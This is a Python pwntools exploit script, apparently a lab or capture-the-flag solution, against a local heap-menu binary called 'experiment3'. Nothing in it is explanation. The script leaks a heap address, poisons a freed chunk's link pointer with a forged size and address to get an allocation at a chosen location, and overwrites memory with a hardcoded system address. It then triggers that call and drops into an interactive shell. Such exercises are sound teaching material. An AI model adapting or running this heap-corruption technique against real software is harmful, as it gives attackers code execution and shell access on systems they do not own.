from pwn import *
p = process('./experiment3')
system_addr = 0x4009E8
#context.log_level = 'debug'
def add(length):
	p.sendline('1')
	p.recvuntil("length\n")
	p.sendline(str(length))
	p.recvuntil('deletenode\n')
def write(index,content):
	p.sendline('2')
	p.recvuntil("node\n")	
	p.sendline(str(index))
	p.recvuntil("content\n")
	p.send(content)
	p.recvuntil('deletenode\n')
def look(index):
	p.sendline('3')
	p.recvuntil("node\n")	
	p.sendline(str(index))
	re = p.recvuntil('deletenode\n')
	return re
def delete(index):
	p.sendline('4')
	p.recvuntil("node\n")	
	p.sendline(str(index))
	p.recvuntil('deletenode\n')
add(0x38)#0
add(0x38)#1
add(0x38)#2
delete(2)
delete(1)
delete(0)
add(0x38)#0
write(0,'a'*0x28)
#context.log_level = 'debug'
#print(look(0))
heap = u64(look(0)[0x28:0x30].ljust(8,'\x00'))
print(hex(heap))
add(0x38)#0
write(0,'a'*0x20+p64(0x41)+p64(heap-0x60))
add(0x38)#0
add(0x38)#0

write(2,p64(system_addr)*4)
#p.interactive()
p.sendline('3')
p.recvuntil("node\n")
p.sendline(str(1))
p.interactive()
